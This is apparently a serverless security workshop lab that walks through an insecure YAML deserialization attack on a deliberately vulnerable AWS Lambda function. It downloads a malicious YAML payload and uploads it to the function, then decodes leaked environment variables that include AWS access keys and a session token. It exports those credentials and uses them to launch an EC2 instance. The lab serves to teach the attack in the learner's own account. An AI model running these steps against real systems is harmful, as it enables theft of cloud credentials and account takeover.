# Insecure Deserialization

In this example, we'll leverage an Insecure Deserialization Attack to compromise and perform lateral movement against the AWS Account

* In your image, navigate over to `/root/labs/Serverless-Workshop/Insecure-Deserialization`
* Wait for instructor to explain the contents of the lab
* Let's look at the contents of the `serverless.yml` [here](https://github.com/we45/Serverless-Workshop/blob/master/DynamoDB-Injection/serverless.yml)
* Deploy the function with the command `sls deploy`
* Wait for the function to deploy completely
* Once the function is deployed, you should see a URL ending with `yaml-upload`
* Let's first upload a yaml file to see what it does

```bash
http POST https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/yaml-upload file=@serverless.yml
```

Now let's run a malicious yaml to see if our attack works

```bash
wget https://raw.githubusercontent.com/we45/container_training/master/Kubernetes/K8s-Cluster-Attack/payloads/test_payment.yml
```

* Examine this file and see what's different about it

Now let's upload the YAML file and see if our payload executes

```bash
http POST https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/yaml-upload file=@test_payment.yml
```

You should see a response like this
```json

{
    "content": {
        "amount": 112,
        "card": 5111111111111111,
        "merchant": "Hello World Traders",
        "name": "PayTM Bill payment 5",
        "reason": "UEFUSD0vdmFyL2xhbmcvYmluO <Truncated base64 value>"
    }
}

```
Copy the Base64 encoded value for the  `reason` key and run: 

```bash
echo "<copied value>" | base64 -d
```

you should see a bunch of environment variables being displayed on screen

```bash
ATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
LANG=en_US.UTF-8
TZ=:UTC
LAMBDA_TASK_ROOT=/var/task
LAMBDA_RUNTIME_DIR=/var/runtime
AWS_REGION=us-west-2
AWS_DEFAULT_REGION=us-west-2
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/we45-sls-workshop-deserial-dev-deserial
AWS_LAMBDA_LOG_STREAM_NAME=2019/07/25/[$LATEST]d10c0fbe300f43f5b5f4827099e506c2
AWS_LAMBDA_FUNCTION_NAME=we45-sls-workshop-deserial-dev-deserial
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=2048
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2
_AWS_XRAY_DAEMON_PORT=2000
AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
AWS_EXECUTION_ENV=AWS_Lambda_python3.7
_HANDLER=handler.main
AWS_ACCESS_KEY_ID=ASIAVGZHAADDDBBAYBAQ
AWS_SECRET_ACCESS_KEY=U1mcVyZoKnbhI+Pl+1113344222344lZRS
AWS_SESSION_TOKEN=SOMEBASE64Value
```

Now run 
`export AWS_ACCESS_KEY_ID=ASIAVGZHAADDDBBAYBAQ` by copying the Access Key ID
next: 
`export AWS_SECRET_ACCESS_KEY=U1mcVyZoKnbhI+Pl+1113344222344lZRS`
next: 
`export AWS_SESSION_TOKEN=SOMEBASE64Value`

you are now using the credential provided by these tokens for the Lambda service

if you run `aws dynamodb list-tables` you should get an error, as you are no longer using the admin profile anymore

### Let's complete the attack

Now we should be able to launch an EC2 instance with this command: 
```bash
aws ec2 run-instances --image-id ami-9abea4fb --count 1 --instance-type t2.micro
```

## Clean up - Very important!!!
### You don't want to leave your AWS Account with actively exploitable RCE flaw

```bash
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN
```

now run `sls remove` to remove the vulnerable function from your account

